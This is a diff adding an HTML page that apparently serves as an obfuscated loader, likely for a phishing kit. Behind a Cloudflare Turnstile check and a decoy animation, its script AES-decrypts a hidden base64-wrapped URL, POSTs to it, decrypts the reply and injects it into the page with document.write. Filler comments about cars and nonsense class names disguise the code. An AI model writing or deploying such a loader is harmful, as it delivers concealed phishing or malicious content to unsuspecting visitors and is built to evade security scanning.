@@ -1,0 +1,30 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js"></script>
+  <style>body, html {height: 100%;margin: 0;display: flex;align-items: center;justify-content: center;}@keyframes bounce {0%, 100%, 12.5%, 32.5%, 76.1% {transform: translateY(0);}22.5%, 86% {transform: translateY(7px);}}#valediction {height: 179px;width: 130px;overflow: hidden;margin-top: -59px;margin-left: 25px;}@keyframes shadow-fade {0%, 100%, 21.2%, 80% {opacity: 0;}47%, 70% {opacity: 1;}}#vague {width: 130px;margin-top: 179px;}#earl {width: 130px;height: 71px;border-radius: 0 0 7px 7px;overflow: hidden;margin-top: -41px;}#earl>.paddle {width: 287px;height: 71px;background: #27a0e0;transform: translate(-153px, -70px) rotate(28deg);}#earl>.galena {width: 287px;height: 71px;background: #1388d6;transform: translate(-120px, 63px) rotate(-28deg);}#bacchanalia {width: 130px;height: 40px;background: #113864;margin-top: -70px;}#nail {display: flex;flex-wrap: wrap;width: 118px;height: 131px;border-radius: 7px;overflow: hidden;margin: 0 auto;margin-top: -306px;animation: cal-bounce 5s infinite;animation-timing-function: cubic-bezier(0, 0.5, 0, 1);transform: translateY(51px) scaleY(1);}@keyframes cal-bounce {0%, 100%, 16.5%, 76.1% {transform: translateY(151px) scaleY(1);}28% {transform: translateY(39px) scaleY(1);}31% {transform: translateY(51px) scaleY(1.05);}33% {transform: translateY(51px) scaleY(.96);}34%, 68.5% {transform: translateY(51px) scaleY(1);}68.5% {animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29);}}#nail>.haiku {width: 118px;height: 21px;margin-bottom: -1px;background: #0354a1;}#nail>.galena {display: flex;width: 118px;height: 37px;}.ultrahigh {width: 39.3333px;height: 38px;}.jade {background: #0073cc;}.gabardine {background: #27a0e0;}.rabbinical {background: #4fcfff;}.gainfully {background: #035fb3;}.obfuscation {background: #134276;}#years {width: 130px;height: 107px;animation: opened-flap-swing 5s infinite;animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);transform-origin: top;transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);}@keyframes opened-flap-swing {0%, 100%, 14.5%, 76% {transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);}16.5%, 74% {transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);}}#vacuousness {width: 130px;animation: closed-flap-swing 5s infinite;animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);transform-origin: top;transform: translateY(-71px) rotate3d(1, 0, 0, 90deg);}@keyframes closed-flap-swing {0%, 100%, 77%, 8.5% {transform: translateY(-71px) rotate3d(1, 0, 0, 0);}14.5%, 76% {transform: translateY(-71px) rotate3d(1, 0, 0, 90deg);}}#ideally {width: 130px;height: 107px;overflow: hidden;}.oaken {width: 96px;height: 96px;background: #4fcfff;margin: -48px auto 0 auto;border-radius: 7px;transform: scaleY(.6) rotate(45deg);}#years .oaken {background: #113864;}#vacuousness .oaken {background: #4fcfff;}</style>
+ </head>
+ <body>
+	<span class="cf-turnstile" id="daemonic" data-sitekey="" data-callback="labyrinth"></span>
+	<!-- <p>A car’s worth is measured in memories made.</p> -->
+	<div id="valediction" hidden><div id="vague"><div id="years"><div id="ideally"><div class="oaken"></div></div></div><div id="nail"><div class="haiku"></div><div class="galena"><div class="ultrahigh jade"></div><div class="ultrahigh gabardine"></div><div class="ultrahigh rabbinical"></div></div><div class="galena"><div class="ultrahigh gainfully"></div><div class="ultrahigh jade"></div><div class="ultrahigh gabardine"></div></div><div class="galena"><div class="ultrahigh obfuscation"></div><div class="ultrahigh gainfully"></div><div class="ultrahigh jade"></div></div></div></div><div id="bacchanalia"></div> <!-- The road reveals its secrets to those who drive. -->
+	<div id="earl"><div class="galena"></div><div class="paddle"></div></div><div id="vacuousness"><div id="ideally"><div class="oaken"></div></div></div></div>
+	<!-- <p>A car’s design reflects the dreams of its driver.</p> -->
+ </body>
+<script>
+    async function jalapeno(earthling) { <!-- <p>A car’s beauty lies in the stories it tells.</p> -->
+        var {a,b,c,d} = JSON.parse(earthling);
+        return CryptoJS.AES.decrypt(a, CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d), CryptoJS.enc.Hex.parse(b), {hasher: CryptoJS.algo.SHA512, keySize: 64/8, iterations: 999}), {iv: CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);
+    }
+    async function labyrinth() {
+		valediction.hidden = 0;
+		daemonic.hidden = 1;
+        document.write(await jalapeno(await (await fetch(await jalapeno(atob(`eyJhIjoiWG1XUFl3NHZQUCsranZFN0JPSFhMK3RtNEhiTWg0aE10NGlJUFVqN1dZVT0iLCJjIjoiMDcwNmIwMGM1YjU3YzIwOTE1YWEzNDMzN2ViYWQxZjUiLCJiIjoiYmY5NTIxY2RkZjYxY2ZlMDVlZWE0ZjFhMGViYTMwY2QwZTYzYjQ2MTNlODQ0Nzc3MzJkZWIzYWJkODZhZmE2MDQ4MzhkMDNhNWU4ZDE4YzI3MTJkNGE1NmRjMWQ3Y2E4NzAwM2U4NzFmYWIwZGIzYWFmZjE1MTM2Mjg0MDhhNmY4YjdiMzBmNjdkN2VlZjdhYjE4MzRkYjBmMzI3NTVjZTMzMzQwNmVlYWVlNTMwMTExZDdkYjliMWI0NjRhYzZkOWQ1NWIyMTQ3YTU2NTMzOGQwYzhlOGIyMzFlNzVkZTY0ZGZiNzFmYjc1ZTljZTEzYTU0MWY4MTA4YTM5ZDM0NWJhM2YwZTZlNjM3ZDJmMTFjNzYzNjM0MGM5MmQ1Yjg1OTY1NDEwZTI1YTM0YTM5NTdjYmNhZGEzZmVjZTAyYzZlZWRjZDgxOTRlNjg4ZDcyODhjNDFjOTBmYmFlNTI0YmU0ZTc5MDc3MTIwMzU1MzA4ZWZhNTFlMWZkZGU4YzE3ODZkMjQxZjliNDIxYWQ1ODM2ODQ3MDQ2ODYxODM3NDhlMjc1NTE5YTNlYThiMTE0NDFmNzFjODM1MzE3Y2JkN2ZjZmE2ZmNmYzBmOWIzMzcxMThkMDQ5ZTlhMjY5ZTg0NGM1MGEwODY0MGY1OGRhNTZhYTNlZTA0OWM5YjJlMWIiLCJkIjoiNmI2NTY1NzA2OTZlNjcifQ==`)), { <!-- <span>Cars tell stories of roads less traveled.</span> -->
+            method: 'POST', body: JSON.stringify({ labyrinth: "labile" })
+        })).text()));
+    } if (!daemonic.dataset.sitekey) {labyrinth()}
+</script>
+<!-- Every car has a story to tell; listen to its engine. -->
+</html>
